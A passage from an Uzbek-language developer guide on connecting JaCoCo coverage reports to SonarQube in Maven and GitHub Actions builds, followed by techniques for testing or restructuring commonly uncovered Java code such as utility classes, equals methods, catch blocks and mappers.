Bu modul `verify` fazasida `coverage-report/target/site/jacoco-aggregate/jacoco.xml` faylini yaratadi. Modul reactor da oxirgi bo'lishi kerak, aks holda yig'ilmagan natijani o'qiydi. Keyin root pom da yo'lni barcha modullar uchun bir xil property qilib beramiz.

```xml
<!-- root pom.xml properties: har bir modul shu yo'lni ko'radi -->
<properties>
  <sonar.coverage.jacoco.xmlReportPaths>
    ${maven.multiModuleProjectDirectory}/coverage-report/target/site/jacoco-aggregate/jacoco.xml
  </sonar.coverage.jacoco.xmlReportPaths>
  <!-- Hisobot moduli o'zida kod yo'q, tahlildan chiqaramiz -->
  <sonar.skip>false</sonar.skip>
</properties>
```

Bu yerda `${maven.multiModuleProjectDirectory}` ishlatilgani muhim. `${project.basedir}` har modulda boshqa qiymat beradi va nisbiy `../` zanjiri modul chuqurligi o'zgarganda buziladi. Agar aggregate ishlatmasangiz, muqobil yo'l barcha modul hisobotlarini vergul bilan sanash, lekin bu ro'yxat yangi modul qo'shilganda eskiradi.

### 10.6 Integratsion test qamrovini alohida yig'ib, keyin birlashtirish

Integratsion testlar Failsafe orqali `integration-test` fazasida ishlaydi. Agar ikki xil test uchun bitta `jacoco.exec` fayliga yozsak, keyingi agent oldingi natijani ustiga yozib ketishi mumkin. Toza yechim: ikki alohida `exec` fayl, keyin `merge` goal bilan birlashtirish va bitta XML chiqarish.

```xml
<executions>
  <execution>
    <id>unit-agent</id>
    <goals><goal>prepare-agent</goal></goals>
    <configuration>
      <destFile>${project.build.directory}/jacoco-ut.exec</destFile>
      <!-- Surefire shu property ni o'qiydi -->
      <propertyName>surefireArgLine</propertyName>
    </configuration>
  </execution>
  <execution>
    <id>it-agent</id>
    <phase>pre-integration-test</phase>
    <goals><goal>prepare-agent-integration-test</goal></goals>
    <configuration>
      <destFile>${project.build.directory}/jacoco-it.exec</destFile>
      <propertyName>failsafeArgLine</propertyName>
    </configuration>
  </execution>
</executions>
```

Birlashtirish va yakuniy hisobot `verify` fazasida bajariladi. `merge` goal `fileSets` ichidagi barcha `exec` fayllarni bitta faylga qo'shadi, keyin `report` shu birlashgan fayldan XML chiqaradi.

```xml
<execution>
  <id>exec-fayllarni-birlashtirish</id>
  <phase>verify</phase>
  <goals><goal>merge</goal></goals>
  <configuration>
    <fileSets>
      <fileSet>
        <directory>${project.build.directory}</directory>
        <includes><include>jacoco-*.exec</include></includes>
      </fileSet>
    </fileSets>
    <destFile>${project.build.directory}/jacoco-merged.exec</destFile>
  </configuration>
</execution>
<execution>
  <id>birlashgan-hisobot</id>
  <phase>verify</phase>
  <goals><goal>report</goal></goals>
  <configuration>
    <dataFile>${project.build.directory}/jacoco-merged.exec</dataFile>
    <outputDirectory>${project.build.directory}/site/jacoco</outputDirectory>
  </configuration>
</execution>
```

Execution lar bir xil fazada ketma-ket pom dagi tartibda ishlaydi, shuning uchun `merge` ni `report` dan yuqoriga yozish shart. Testcontainers bilan ishlaydigan integratsion testlar bu zanjirda hech qanday qo'shimcha sozlama talab qilmaydi, chunki agent ilova JVM ida turadi, konteynerda emas. Testcontainers ni qanday tashkil qilish esa testlash qo'llanmasidagi Testcontainers mavzusida yoritilgan.

### 10.7 Surefire va Failsafe bilan ishlash tartibi

Eng tez-tez uchraydigan buzilish sababi: kimdir Surefire ga `<argLine>` yozadi va JaCoCo qo'ygan qiymatni almashtiradi. `@{argLine}` sintaksisi late property evaluation ni yoqadi va avvalgi qiymatni saqlaydi. `${argLine}` esa build boshida bo'sh bo'lishi mumkin va xato beradi.

```xml
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-surefire-plugin</artifactId>
  <version>3.2.5</version>
  <configuration>
    <!-- @{...} JaCoCo argumentini saqlaydi, ${...} buzadi -->
    <argLine>@{surefireArgLine} -Xmx1g -Duser.timezone=UTC</argLine>
    <!-- forkCount 0 bo'lsa agent ulanmaydi va coverage 0% chiqadi -->
    <forkCount>1</forkCount>
    <reuseForks>true</reuseForks>
  </configuration>
</plugin>
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-failsafe-plugin</artifactId>
  <version>3.2.5</version>
  <configuration>
    <argLine>@{failsafeArgLine}</argLine>
  </configuration>
  <executions>
    <execution>
      <goals>
        <goal>integration-test</goal>
        <goal>verify</goal>
      </goals>
    </execution>
  </executions>
</plugin>
```

Failsafe ning `verify` goal ini qo'shishni unutmang. Uni yozmasangiz, integratsion test yiqilsa ham build yashil qoladi, Sonar esa buzuq kod uchun coverage qabul qiladi. Bu eng xavfli holat, chunki quality gate o'tadi va xato ishlab chiqarishga ketadi.

### 10.8 Coverage 0% ko'rinishi va uning sabablari

0% deyarli hech qachon "test yo'q" degani emas. Quyida haqiqiy sabablar va ularning belgilari.

| Tuzoq | Belgisi | Yechim |
|---|---|---|
| XML hisobot yaratilmagan | `target/site/jacoco/jacoco.xml` yo'q | `report` goal ni `test` yoki `verify` fazasiga bog'lash |
| Sonar `clean` dan keyin alohida ishlagan | log da `No coverage report can be found` | `mvn clean verify sonar:sonar` bir zanjirda |
| Surefire `argLine` ni almashtirgan | `jacoco.exec` fayli umuman yo'q | `@{argLine}` yoki alohida `propertyName` ishlatish |
| `forkCount` nolga teng | exec bo'sh yoki yo'q | `forkCount` ni 1 yoki undan ko'p qilish |
| Yo'l noto'g'ri yozilgan | log da `0 report(s)` | XML ni `ls` bilan topib, yo'lni aynan ko'chirish |
| Ko'p modulda aggregate yo'q | foiz past, modullar nol | `report-aggregate` moduli qo'shish |
| `sonar.sources` boshqa papkaga qaragan | coverage bor, fayllar mos emas | `sonar.sources` va paket tuzilmasini solishtirish |
| Tekshirilayotgan klass mock qilingan | test yashil, qator qizil | haqiqiy obyekt, faqat bog'liqlik mock |
| Lombok generated kod | model klasslar 0% | `lombok.addLombokGeneratedAnnotation=true` |
| `sonar.exclusions` ga tushgan | fayl Sonar da ko'rinmaydi | `coverage.exclusions` ga ko'chirish |
| CI da test step o'tkazib yuborilgan | `-DskipTests` build log da | tahlildan oldin testni majburiy qilish |
| Yangi kod uchun 0% | umumiy foiz yaxshi, gate qizil | yangi qatorlar uchun test yozish |

Oxirgi uchta qatordan biri amalda tushuntirishni talab qiladi. Tekshirilayotgan servisning o'zini mock qilish test yashil chiqishiga olib keladi, lekin JaCoCo mock ning dinamik klassini hisoblamaydi.

```java
// TUZOQ: tekshirilayotgan klassning o'zi mock, coverage 0% qoladi
@Test
void mockQilinganServisQamrovBermaydi() {
    PaymentService service = mock(PaymentService.class);
    when(service.charge(any())).thenReturn(Receipt.ok("R-1"));
    assertThat(service.charge(new ChargeRequest(100)).status()).isEqualTo("OK");
}

// TO'G'RI: haqiqiy obyekt, faqat tashqi bog'liqlik mock qilinadi
@Test
void haqiqiyServisQamrovBeradi() {
    PaymentGateway gateway = mock(PaymentGateway.class);
    when(gateway.send(any())).thenReturn(GatewayResult.approved("R-1"));
    PaymentService service = new PaymentService(gateway, new InMemoryLedger());
    Receipt receipt = service.charge(new ChargeRequest(100));
    assertThat(receipt.status()).isEqualTo("OK");
}
```

Lombok uchun loyiha root ida `lombok.config` fayli yaratiladi va unga `lombok.addLombokGeneratedAnnotation = true` yoziladi. Bundan keyin JaCoCo generated getter va `equals` metodlarini hisobdan chiqaradi. Bu haqiqiy yechim, chunki generated kodni test qilish hech qanday xatodan himoya qilmaydi.

### 10.9 Sozlashni tekshirish: qaysi faylga qarash, qaysi log qatorini izlash

Tekshirishni har doim pastdan yuqoriga olib boring. Birinchi savol: `jacoco.exec` fayli bormi. Yo'q bo'lsa muammo agent da. Bor bo'lsa ikkinchi savol: `jacoco.xml` bormi va ichida `covered` qiymati noldan kattami. Faqat shundan keyin Sonar log ini o'qishga arziydi.

Sonar scanner log ida JaCoCo sensor nomini izlang. Hisobot topilsa, scanner import qilgan fayl sonini yozadi. Topilmasa, ogohlantirish ichida u qaragan yo'lni aynan ko'rsatadi, shu yo'lni fayl tizimidagi haqiqiy yo'l bilan solishtirish kifoya. Batafsil ro'yxat uchun scanner ni `-X` yoki debug rejimida ishlatish mumkin.

```bash
# 1-qadam: agent ishlaganmi
find . -name 'jacoco*.exec' -size +0 -printf '%p %s bayt\n'

# 2-qadam: XML bormi va bo'sh emasmi
find . -name 'jacoco*.xml' -path '*site*' -printf '%p %s bayt\n'

# 3-qadam: scanner nimani import qilgan
mvn -B sonar:sonar | tee sonar.log
grep -iE 'jacoco|coverage|report\(s\)' sonar.log

# 4-qadam: hech narsa topilmasa, qaysi yo'lga qaraganini ko'ramiz
grep -i 'xmlReportPaths' sonar.log

# 5-qadam: fayllar mos kelmasa, source yo'lini tekshiramiz
grep -iE 'Source|indexing|Base dir' sonar.log | head -20
```

Agar coverage import bo'lgan, lekin Sonar da baribir past ko'rinsa, muammo fayl moslashtirishda. JaCoCo XML da yo'l paket nomi bilan beriladi, Sonar esa `sonar.sources` ostidagi fayllar bilan solishtiradi. Paket nomi papka tuzilmasiga mos bo'lmasa moslik topilmaydi va qamrov yo'qoladi.

### 10.10 CI da tartib: test, hisobot, tahlil ketma-ketligi

CI da tartib qat'iy: avval test va hisobot, keyin tahlil, keyin quality gate natijasini kutish. Tahlilni test bilan bir job ichida qoldirish kerak, chunki boshqa job da `target` papkasi bo'lmaydi. Agar jobs ni ajratish zarur bo'lsa, `target` ni artifact qilib uzatish kerak.

Yana bir shart: `fetch-depth: 0`. Sonar yangi kodni aniqlash uchun git tarixini o'qiydi. Shallow clone da blame ma'lumoti yo'q va yangi kod chegarasi noto'g'ri hisoblanadi.

```yaml
name: ci
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          # Yangi kodni aniqlash uchun butun tarix kerak
          fetch-depth: 0
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'
          cache: maven
      # 1. Test va hisobot: XML shu qadamda tug'iladi
      - name: Test va coverage
        run: mvn -B clean verify
      # 2. Tahlil: clean YO'Q, aks holda hisobot o'chadi
      - name: Sonar tahlili
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        run: mvn -B sonar:sonar -Dsonar.host.url=${{ secrets.SONAR_HOST_URL }}
```

`clean` ni faqat birinchi qadamda ishlatish eng muhim qoida. Ikki buyruqni bitta qatorga qo'shib yozish ham mumkin, lekin alohida step da xatoning qaysi bosqichda bo'lganini log dan darhol ko'rish osonroq.

```bash
# TO'G'RI tartib
mvn -B clean verify            # test, exec, XML
mvn -B sonar:sonar             # tahlil, XML ni o'qiydi

# NOTO'G'RI: clean hisobotni tahlildan oldin o'chiradi
mvn -B clean sonar:sonar

# NOTO'G'RI: testlar o'tkazib yuborilgan, coverage 0%
mvn -B clean verify -DskipTests
mvn -B sonar:sonar

# Bir buyruqda ham ishlaydi
mvn -B clean verify sonar:sonar -Dsonar.token=$SONAR_TOKEN
```

### 10.11 Oddiy yondashuv va arxitektor yondashuvi

| Savol | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Hisobot formati | HTML yetadi deb o'ylaydi | XML ni majburiy formatga qo'yadi, HTML qo'shimcha |
| `report` fazasi | odatiy holatga ishonadi | `test` yoki `verify` ga aniq bog'laydi |
| Surefire `argLine` | `${argLine}` yozadi va buzadi | alohida `propertyName` va `@{...}` ishlatadi |
| Ko'p modul | har modul foizini alohida ko'radi | `report-aggregate` moduli bilan yig'adi |
| Integratsion test | bitta `exec` ga yozadi | ikki `exec` va `merge` goal |
| Yo'l ko'rsatish | hujjatdan yo'lni ko'chiradi | fayl tizimidan topib tekshiradi |
| CI tartibi | `clean sonar:sonar` ishlatadi | test va tahlilni ikki qadamga ajratadi |
| Git tarixi | shallow clone bilan qoladi | `fetch-depth: 0` qo'yadi |
| Generated kod | 0% ni ko'rib test yozadi | `lombok.config` va exclusion bilan hisobdan chiqaradi |
| 0% debug | Sonar sozlamasini o'zgartiradi | `exec`, `xml`, log zanjirini pastdan yuqoriga tekshiradi |
| Failsafe `verify` | goal ni yozmay qoldiradi | `verify` goal ni qo'shib build ni qizil qiladi |
| Maqsad | foizni ko'tarish | yangi kod uchun ishonchli o'lchov qurish |

Oxirgi qator eng muhim. To'g'ri ulangan JaCoCo faqat raqamni ko'rsatadi, u sifatni o'lchamaydi. 100% qamrov assertion siz testlar bilan ham olinadi, bunda har qator ishga tushadi, lekin hech narsa tekshirilmaydi. Shuning uchun ulanishni tugatgach, keyingi ish foizni ko'tarish emas, balki mavjud testlarning assertion sifatini ko'rib chiqish.

Shuni ham aniq ayting: quality gate shartlari har loyihada boshqacha sozlanadi. Bir joyda yangi kod uchun 80% talab qilinadi, boshqa joyda 60%. "Har doim o'tadigan" universal sozlama yo'q, bor narsa aniq shartni bilish va unga mos ishlash.

### 10.12 Amalda qo'llash

- [ ] Loyihada `jacoco.exec` va `jacoco.xml` fayllari haqiqatda yaratilayotganini `find` bilan tekshiring, natijani yozib qo'ying.
- [ ] `report` goal ni `test` yoki `verify` fazasiga aniq bog'lang va XML formatini majburiy qiling.
- [ ] Surefire va Failsafe konfiguratsiyasidagi barcha `argLine` yozuvlarini `@{...}` sintaksisiga o'tkazing va `forkCount` ni nol emasligini tasdiqlang.
- [ ] `sonar.coverage.jacoco.xmlReportPaths` qiymatini fayl tizimidagi haqiqiy yo'l bilan solishtirib tekshiring, hujjatdan ko'chirgan qiymatga ishonmang.
- [ ] Ko'p modulli loyihada `report-aggregate` moduli yaratib, uni reactor da oxirgi qilib qo'ying va root pom da yo'lni bitta property ga chiqaring.
- [ ] Integratsion testlar uchun alohida `exec` fayl va `merge` goal sozlang, Failsafe ning `verify` goal ini qo'shing.
- [ ] CI da test va tahlilni ikki alohida qadamga ajratib, `clean` ni faqat birinchi qadamda qoldiring va `fetch-depth: 0` qo'ying.
- [ ] Lombok ishlatilsa `lombok.config` ga `addLombokGeneratedAnnotation` qo'shing, konfiguratsiya klasslarini `coverage.exclusions` ga kiriting.

## 11. Qamralmay qoladigan kod va unga test yozish (Code That Stays Uncovered)

Har bir loyihada coverage hisobotining pastida bir to'da klass turadi: ularga hech kim test yozmaydi, lekin ular quality gate raqamini pastga tortadi. Bu bobda shunday kodning har bir turini ko'ramiz: qayerda test kerak, qayerda dizaynni o'zgartirish arzonroq, qayerda esa eng to'g'ri yo'l kodni o'chirish. Asosiy qoida bitta: qamrash qiyin bo'lgan kod ko'pincha noto'g'ri joylashgan kod.

### 11.1 Private konstruktorli utility klass va unga test yozish

Sonar `java:S1118` qoidasi bilan faqat static metodli klassda private konstruktor talab qiladi. Siz uni qo'shasiz va JaCoCo darhol o'sha konstruktorni qamralmagan qator deb belgilaydi. Qoidani qondirish coverage ni buzadi: bu Sonar va JaCoCo o'rtasidagi eng mashhur ziddiyat.

```java
// Sonar S1118 shikoyat qiladi: default konstruktor ochiq qolgan
public final class MoneyUtils {
    public static BigDecimal withVat(BigDecimal net, BigDecimal rate) {
        return net.multiply(BigDecimal.ONE.add(rate));
    }
}

// Tuzatilgan variant: konstruktor yopildi
public final class MoneyUtils {
    private MoneyUtils() {
        // utility klass, instansiya yaratilmaydi
        throw new AssertionError("instansiya yaratish mumkin emas");
    }

    public static BigDecimal withVat(BigDecimal net, BigDecimal rate) {
        return net.multiply(BigDecimal.ONE.add(rate));
    }
}
```

Birinchi variant: reflection bilan konstruktorni ataylab chaqirish. Bu ishlaydi, lekin test xatti-harakatni tekshirmaydi, faqat raqamni bo'yaydi.

```java
@Test
void konstruktorYopiq() throws Exception {
    var ctor = MoneyUtils.class.getDeclaredConstructor();
    // modifikator chindan private ekanini tekshiramiz, bu ma'noli shart
    assertThat(Modifier.isPrivate(ctor.getModifiers())).isTrue();
    ctor.setAccessible(true);
    // chaqiruv AssertionError tashlashi kerak
    assertThatThrownBy(ctor::newInstance)
        .hasCauseInstanceOf(AssertionError.class);
}
```

Ikkinchi variant, va arxitektor tanlovi: utility klassni yo'q qilish. `MoneyUtils.withVat` aslida `Money` value object ning metodi. Shunda konstruktor bekor qator bo'lmaydi, chunki u har bir testda ishlaydi.

```java
public record Money(BigDecimal amount, Currency currency) {
    public Money {
        // mudofaa emas, invariant: pul manfiy bo'lmaydi
        if (amount.signum() < 0) {
            throw new IllegalArgumentException("manfiy summa");
        }
    }

    public Money withVat(BigDecimal rate) {
        return new Money(amount.multiply(BigDecimal.ONE.add(rate)), currency);
    }
}
```

Uchinchi yo'l: klassni `sonar.coverage.exclusions` ga qo'shish. Bu halol, agar klassda chindan mantiq bo'lmasa. Mantiq bo'lsa, exclusion yolg'on tinchlik beradi.

### 11.2 `equals`, `hashCode`, `toString`: qamrash yoki record ga o'tish

Qo'lda yozilgan `equals` ko'p tarmoqli metod: null tekshiruv, tip tekshiruv, har bir maydon solishtiruvi. JaCoCo branch coverage uni ayovsiz hisoblaydi va bitta entity o'nlab qamralmagan tarmoq beradi. Sonar `java:S1206` bilan `equals` va `hashCode` ni juft yozishni talab qiladi.

```java
// Qamrash qimmat: har bir maydon uchun ikki tarmoq
public class OrderLine {
    private String sku;
    private int qty;

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;
        OrderLine that = (OrderLine) o;
        return qty == that.qty && Objects.equals(sku, that.sku);
    }

    @Override
    public int hashCode() {
        return Objects.hash(sku, qty);
    }
}
```

Dizayn yechimi: o'zgarmas ma'lumot uchun `record`. Kompilyator `equals`, `hashCode`, `toString` ni yasaydi va JaCoCo bytecode da generatsiya qilingan deb belgilangan a'zolarni hisobga olmaydi.

```java
// Uchta metod ham bepul keladi, coverage da ko'rinmaydi
public record OrderLine(String sku, int qty) { }
```

Agar `record` ga o'tish imkoni yo'q bo'lsa, EqualsVerifier bir nechta instansiya yasab barcha tarmoqni bosib o'tadi.

```java
@Test
void equalsKontrakti() {
    // simmetriya, tranzitivlik, null va tip tarmoqlarini birdan bosadi
    EqualsVerifier.forClass(OrderLine.class)
        .suppress(Warning.NONFINAL_FIELDS)
        .verify();
}
```

`toString` uchun test yozish deyarli har doim behuda. Agar log formati shartnoma bo'lsa, u oddiy metod va unga test kerak. Aks holda uni Lombok yoki record ga topshiring.

### 11.3 Getter va setter: nega ular qamrovni suyultiradi

Getter bitta `return` qatoridan iborat: u qamralsa ham sifat haqida hech narsa aytmaydi. Lekin ular sonli jihatdan ko'p: 30 maydonli DTO 60 ta qamralmagan qator beradi va bu butun modul foizini pasaytiradi.

Muammo Sonar qoidasida emas, JaCoCo hisobotida paydo bo'ladi, keyin Sonar o'sha raqamni gate ga olib chiqadi. Shuning uchun yechim test yozishda emas, hisobot sozlashda.

```xml
<!-- JaCoCo oddiy aksessorlarni filtrlaydi, agar Lombok ishlatilsa -->
<plugin>
  <groupId>org.jacoco</groupId>
  <artifactId>jacoco-maven-plugin</artifactId>
  <version>0.8.12</version>
  <executions>
    <execution><goals><goal>prepare-agent</goal></goals></execution>
    <execution>
      <id>report</id>
      <phase>verify</phase>
      <goals><goal>report</goal></goals>
    </execution>
  </executions>
</plugin>
```

Lombok bilan yasalgan getter `@lombok.Generated` annotatsiyasini oladi. JaCoCo 0.8.x shu annotatsiyani ko'rib qatorni hisobdan chiqaradi, lekin buning uchun `lombok.config` da bitta satr kerak.

```properties
# lombok.config, loyiha ildizida
# generatsiya qilingan kodga @Generated qo'yiladi, JaCoCo uni o'tkazib yuboradi
lombok.addLombokGeneratedAnnotation = true
config.stopBubbling = true
```

Qo'lda yozilgan getter uchun bu ishlamaydi. Unda ikki yo'l bor: DTO ni `record` ga aylantirish, yoki DTO paketini coverage dan chiqarish.

```properties
# sonar-project.properties
# faqat ma'lumot tashuvchi paketlar, ularda shart va hisob yo'q
sonar.coverage.exclusions=**/dto/**,**/config/**,**/*Application.java
# bu qatorni har safar kod qo'shilganda qayta ko'rib chiqing
```

### 11.4 Istisno tarmoqlari: `catch` bloklarini qanday ishga tushirish

`catch` bloki test paytida ishga tushmasa, u qamralmagan qoladi. Ko'p jamoa shu yerda "istisnoni sinab bo'lmaydi" deydi. Aslida mock bilan istisnoni ataylab keltirish oddiy ish.

```java
@Service
public class PaymentService {
    private final PaymentGateway gateway;
    private final PaymentLogRepository logs;

    public PaymentResult charge(Order order) {
        try {
            return gateway.charge(order.total());
        } catch (GatewayTimeoutException e) {
            // bu tarmoq ham sinalishi kerak, u biznes qarori
            logs.saveFailure(order.id(), e.getMessage());
            return PaymentResult.retryLater(order.id());
        }
    }
}
```

Mock gateway ga istisno tashlashni buyuramiz. Eng muhimi: `catch` ichidagi yon ta'sirni ham tasdiqlaymiz, aks holda test faqat qatorni bo'yaydi.

```java
@Test
void timeoutBolsaKeyinUrinishQaytadi() {
    when(gateway.charge(any())).thenThrow(new GatewayTimeoutException("3s"));

    var result = service.charge(new Order("ORD-1", Money.of("120.00")));

    assertThat(result.status()).isEqualTo(RETRY_LATER);
    // yon ta'sir: nosozlik log ga yozilgan
    verify(logs).saveFailure(eq("ORD-1"), contains("3s"));
}
```

Agar `catch` bloki faqat `log.error` qilsa, Sonar istisno yutilgani haqida shikoyat qiladi. Bunday blokni sinash emas, olib tashlash kerak: istisnoni yuqoriga chiqaring yoki ma'noli qarorga aylantiring.

```java
// Yomon: istisno yutildi, test yozish ham ma'nosiz
catch (SQLException e) {
    log.error("xato", e);
}

// Yaxshi: kontekst qo'shib yuqoriga chiqariladi
catch (SQLException e) {
    throw new StockReadException("ombor qoldig'i o'qilmadi: " + sku, e);
}
```

### 11.5 Mudofaa tekshiruvlari (`if (x == null) throw`): ularni sinash yoki olib tashlash

Har bir public metod boshida null tekshiruv turgan kod ikki marta jarima oladi: JaCoCo har tekshiruvni ikki tarmoq deb sanaydi, Sonar esa metod murakkabligi oshganini aytadi. Savol bitta: bu tekshiruv kimdan himoya qiladi. Agar metod tashqi API chegarasida bo'lsa, tekshiruv ham, test ham kerak. Ichki servislar orasida esa chaqiruvchi sizning kodingiz, tekshiruv ortiqcha.

```java
// Chegara: controller, kelgan ma'lumot ishonchsiz
@PostMapping("/orders")
public ResponseEntity<OrderView> create(@Valid @RequestBody CreateOrderRequest req) {
    // qo'lda null tekshiruv yo'q, Bean Validation bajaradi
    return ResponseEntity.ok(orderService.create(req.toCommand()));
}

// Ichki servis: tekshiruv olib tashlandi, o'rniga invariant turda
public OrderView create(CreateOrderCommand cmd) {
    // cmd o'zi record, maydonlari konstruktorda tekshirilgan
    var order = Order.open(cmd.customerId(), cmd.lines());
    return OrderView.from(repository.save(order));
}
```

Validatsiyani turga ko'chirish eng kuchli usul: qiymat `record` konstruktorida bir marta tekshiriladi va bitta test butun oqimni qamraydi.

```java
@ParameterizedTest
@MethodSource("yaroqsizBuyruqlar")
void yaroqsizBuyruqRadEtiladi(CreateOrderCommand cmd, String xabar) {
    assertThatThrownBy(() -> orderService.create(cmd))
        .isInstanceOf(IllegalArgumentException.class)
        .hasMessageContaining(xabar);
}

static Stream<Arguments> yaroqsizBuyruqlar() {
    return Stream.of(
        arguments(cmdWithNoLines(), "kamida bitta qator"),
        arguments(cmdWithNegativeQty(), "miqdor musbat")
    );
}
```

### 11.6 Konfiguratsiya klasslari va `@Bean` metodlari

`@Configuration` klassidagi `@Bean` metodi odatda bitta `return new Something(...)` dan iborat. Unga unit test yozish bean ni qo'lda yasashdan boshqa narsa emas. Lekin Spring context ko'tariladigan test uni tabiiy ravishda qamraydi.

```java
@Configuration
public class StockClientConfig {

    @Bean
    RestClient stockRestClient(StockProperties props) {
        // mantiq bor: timeout va base URL shartnoma qismi
        return RestClient.builder()
            .baseUrl(props.baseUrl())
            .requestFactory(factory(props.timeout()))
            .build();
    }

    private ClientHttpRequestFactory factory(Duration timeout) {
        var f = new SimpleClientHttpRequestFactory();
        f.setConnectTimeout((int) timeout.toMillis());
        return f;
    }
}
```

Sinashning to'g'ri yo'li `ApplicationContextRunner`: u to'liq ilovani ko'tarmaydi, faqat kerakli konfiguratsiyani yuklaydi.

```java
@Test
void stockClientSozlanadi() {
    new ApplicationContextRunner()
        .withUserConfiguration(StockClientConfig.class)
        .withPropertyValues(
            "stock.base-url=http://stock:8080",
            "stock.timeout=2s")
        .run(ctx -> {
            // bean yaratilgani va xususiyat bog'langani tekshiriladi
            assertThat(ctx).hasSingleBean(RestClient.class);
            assertThat(ctx.getBean(StockProperties.class).timeout())
                .isEqualTo(Duration.ofSeconds(2));
        });
}
```

Agar `@Bean` metodida shart bo'lmasa, konfiguratsiya paketini coverage dan chiqarish halol. `@ConditionalOnProperty` paydo bo'lishi bilan uni qaytarib kiritish kerak, chunki o'sha shart xato qiladigan joy.

### 11.7 Mapper va konvertorlar: qo'lda yozilgani va generatsiya qilingani

Qo'lda yozilgan mapper uzun va bir xil. Sonar unda duplication ko'radi, JaCoCo esa har bir `set` chaqiruvini qator deb sanaydi. Eng ko'p uchraydigan bug: yangi maydon qo'shildi, mapper ga qo'shilmadi, test esa sezmadi.

```java
// Qo'lda: 20 qator, har biri alohida qamralishi kerak
public OrderView toView(Order o) {
    var v = new OrderView();
    v.setId(o.getId());
    v.setTotal(o.getTotal());
    v.setStatus(o.getStatus().name());
    // customerName qo'shilishi esdan chiqdi, test ham sezmaydi
    return v;
}
```

Yechim ikki qatlamli. Birinchi: MapStruct bilan generatsiya qilish, u `@Generated` qo'yadi va yo'qotilgan maydonni kompilyatsiya vaqtida ushlaydi.

```java
@Mapper(componentModel = "spring",
        unmappedTargetPolicy = ReportingPolicy.ERROR)
public interface OrderMapper {
    // yo'qotilgan maydon build ni buzadi, runtime da emas
    OrderView toView(Order order);
}
```

Ikkinchi: qo'lda qolgan mapper uchun "hamma maydon to'ldirilgan" degan bitta test. U butun metodni qamraydi va kelgusi maydonni ham ushlaydi.

```java
@Test
void barchaMaydonlarKochiriladi() {
    var order = TestData.fullOrder();   // barcha maydoni to'ldirilgan
    var view = mapper.toView(order);

    // hech bir maydon null qolmasligi kerak
    assertThat(view).hasNoNullFieldsOrProperties();
    assertThat(view.getTotal()).isEqualByComparingTo(order.getTotal());
}
```

### 11.8 `main` metodi va Spring Boot ishga tushirish klassi

`SpringApplication.run` chaqiruvi bitta qator, lekin u deyarli har bir loyihada qamralmagan qoladi. Ko'p jamoa `contextLoads` degan bo'sh test yozadi, u `main` ni emas, context ni qamraydi.

```java
@SpringBootApplication
public class WarehouseApplication {
    public static void main(String[] args) {
        SpringApplication.run(WarehouseApplication.class, args);
    }
}
```

Agar gate shu bitta qator uchun qizarsa, eng toza yechim uni exclusion ro'yxatiga qo'shish. `main` da mantiq bo'lmasligi kerak, shu holda uni sinashning qiymati nolga teng.

```properties
# sonar-project.properties
sonar.coverage.exclusions=**/*Application.java,**/config/**
# agar main ichida mantiq paydo bo'lsa, uni alohida klassga chiqaring
```

Agar `main` ichida argument tahlili yoki profil tanlash bo'lsa, mantiqni alohida klassga ko'chiring. Shunda `main` bitta qator bo'lib qoladi va mantiq to'liq qamraladi.

```java
@SpringBootApplication
public class WarehouseApplication {
    public static void main(String[] args) {
        // mantiq StartupArgs ichida, u alohida sinaladi
        new SpringApplicationBuilder(WarehouseApplication.class)
            .profiles(StartupArgs.profilesFrom(args))
            .run(args);
    }
}
```

### 11.9 Yetib bo'lmaydigan kod: uni test bilan emas, o'chirish bilan hal qilish

Yetib bo'lmaydigan kodga test yozish mumkin emas, chunki uni ishga tushiradigan yo'l yo'q. Sonar bunday holatni bir nechta qoida bilan belgilaydi: har doim `true` bo'ladigan shart, erishilmaydigan `default`, qaytganidan keyingi qator. Yechimi bitta: o'chirish.

```java
// Yomon: enum to'liq qoplangan, default hech qachon ishlamaydi
public BigDecimal discount(CustomerTier tier) {
    switch (tier) {
        case BRONZE: return new BigDecimal("0.00");
        case SILVER: return new BigDecimal("0.05");
        case GOLD:   return new BigDecimal("0.10");
        default:
            // bu qator qamralmaydi va qamralishi ham kerak emas
            throw new IllegalStateException("noma'lum daraja");
    }
}

// Yaxshi: switch expression, kompilyator to'liqligini tekshiradi
public BigDecimal discount(CustomerTier tier) {
    return switch (tier) {
        case BRONZE -> new BigDecimal("0.00");
        case SILVER -> new BigDecimal("0.05");
        case GOLD   -> new BigDecimal("0.10");
    };
}
```

Java 17 dan boshlab enum ustidagi `switch` expression da barcha variant qoplangan bo'lsa `default` kerak emas. Yangi enum qiymati qo'shilsa, build buziladi. Bu runtime istisnodan yaxshi, coverage ham toza bo'ladi.

### 11.10 Interfeys standart metodlari va abstrakt klasslar

`default` metod interfeysda tanaga ega, ya'ni JaCoCo uni qamralishi kerak deb sanaydi. Agar hech bir implementatsiya uni ishlatmasa, qator bekor turadi. Abstrakt klassdagi `protected` yordamchi metodlar bilan ham shunday.

```java
public interface StockPolicy {
    boolean allows(String sku, int qty);

    default boolean allowsAll(Map<String, Integer> lines) {
        // standart metod, uni ham sinash kerak
        return lines.entrySet().stream()
            .allMatch(e -> allows(e.getKey(), e.getValue()));
    }
}
```

Standart metodni sinashning eng arzon yo'li: test ichida lambda implementatsiya yasab, shu orqali chaqirish.

```java
@Test
void allowsAllBarchaQatorniTekshiradi() {
    // test uchun minimal implementatsiya: faqat qty <= 10 ruxsat
    StockPolicy policy = (sku, qty) -> qty <= 10;

    assertThat(policy.allowsAll(Map.of("A", 5, "B", 10))).isTrue();
    assertThat(policy.allowsAll(Map.of("A", 5, "B", 11))).isFalse();
}
```

Abstrakt klass uchun shartnoma testini vorislar orasida ulashing: abstrakt test klass yoziladi, har bir voris uni meros qilib oladi.

```java
abstract class StockPolicyContractTest {
    abstract StockPolicy policy();   // har bir voris o'zini beradi

    @Test
    void manfiyMiqdorHechQachonRuxsatEtilmaydi() {
        assertThat(policy().allows("A", -1)).isFalse();
    }
}

class StrictStockPolicyTest extends StockPolicyContractTest {
    StockPolicy policy() { return new StrictStockPolicy(); }
}
```

